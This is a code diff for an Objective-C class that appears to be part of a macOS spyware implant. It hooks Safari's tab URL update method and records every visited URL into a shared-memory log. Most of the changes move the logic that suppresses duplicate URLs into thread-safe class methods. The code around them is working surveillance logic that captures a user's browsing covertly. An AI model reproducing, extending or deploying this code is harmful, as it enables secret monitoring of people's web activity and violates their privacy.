@@ -17,10 +17,75 @@
 
 #define BROWSER_MO_SAFARI    0x00000006
 
+static id       gAgentUrlClass = nil;
 static NSDate   *gURLDate = nil;
 static NSString *gPrevURL = nil;
 
 @implementation agentURL
+
++ (void)setLastUrlTime
+{
+  @synchronized(gAgentUrlClass)
+  {
+    [gURLDate release];
+    gURLDate = [[NSDate date] retain];
+  }
+}
+
++ (NSTimeInterval)getLastUrlTime
+{
+  NSTimeInterval gInterval;
+  
+  @synchronized(gAgentUrlClass)
+  {
+    if (gURLDate == nil)
+    {
+      gURLDate = [[NSDate date] retain];
+    }
+    
+    gInterval = [[NSDate date] timeIntervalSinceDate: gURLDate];
+  }
+  
+  return gInterval;
+}
+
++ (void)setPrevUrl:(NSString*)_url
+{
+  @synchronized(gAgentUrlClass)
+  {
+    if (gPrevURL != nil)
+      [gPrevURL release];
+    
+    gPrevURL = [_url copy];
+  }
+}
+
++ (BOOL)isDuplicateUrl:(NSString*)_url
+{  
+  NSTimeInterval gInterval = [agentURL getLastUrlTime];
+  
+  NSString *tempUrl1 = [_url stringByReplacingOccurrencesOfString: @"http://"
+                                                       withString: @""];
+  NSString *tempUrl2 = [_url stringByReplacingOccurrencesOfString: @"http://www."
+                                                       withString: @""];
+  NSString *tempUrl3 = [_url stringByReplacingOccurrencesOfString: @"www."
+                                                       withString: @""];
+  
+  if (gPrevURL != nil &&
+     ([gPrevURL isEqualToString: _url]     ||
+      [gPrevURL isEqualToString: tempUrl1] ||
+      [gPrevURL isEqualToString: tempUrl2] ||
+      [gPrevURL isEqualToString: tempUrl3] ) &&
+      gInterval <= (double)5)
+  {
+    return TRUE;
+  }
+  
+  [agentURL setPrevUrl:_url];
+  [agentURL setLastUrlTime];
+  
+  return FALSE;
+}
 
 - (void)tabDocumentDidUpdateURLHook: (id)arg1
 {
@@ -28,8 +93,7 @@ static NSString *gPrevURL = nil;
   [self tabDocumentDidUpdateURLHook: arg1];
   
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  NSTimeInterval gInterval;
+
   struct timeval tp;
   NSString      *_windowName = nil;
   NSMutableData *windowName  = nil;
@@ -47,40 +111,12 @@ static NSString *gPrevURL = nil;
       return;
     }
   
-  if (gURLDate == nil)
-    {
-      gURLDate = [[NSDate date] retain];
-    }
-  
-  gInterval = [[NSDate date] timeIntervalSinceDate: gURLDate];
-  
-  NSString *tempUrl1 = [_url stringByReplacingOccurrencesOfString: @"http://"
-                                                       withString: @""];
-  NSString *tempUrl2 = [_url stringByReplacingOccurrencesOfString: @"http://www."
-                                                       withString: @""];
-  NSString *tempUrl3 = [_url stringByReplacingOccurrencesOfString: @"www."
-                                                       withString: @""];
-  
-  if (gPrevURL != nil
-      && ( [gPrevURL isEqualToString: _url]
-          || [gPrevURL isEqualToString: tempUrl1]
-          || [gPrevURL isEqualToString: tempUrl2]
-          || [gPrevURL isEqualToString: tempUrl3] )
-      && gInterval <= (double)5)
-    {
-      [_url release];
-      [gURLDate release];
-      [pool release];
-      return;
-    }
-  
-  if (gPrevURL != nil)
-    [gPrevURL release];
-  
-  gPrevURL = [_url copy];
-  
-  [gURLDate release];
-  gURLDate = [[NSDate date] retain];
+  if ([agentURL isDuplicateUrl:_url] == TRUE)
+  {
+    [_url release];
+    [pool release];
+    return;
+  }
   
   NSData *url               = [_url dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
@@ -187,8 +223,10 @@ static NSString *gPrevURL = nil;
   self = [super init];
   
   if (self != nil)
+  {
     mAgentID = AGENT_URL;
-  
+    gAgentUrlClass = self;
+  }
   return self;
 }
 
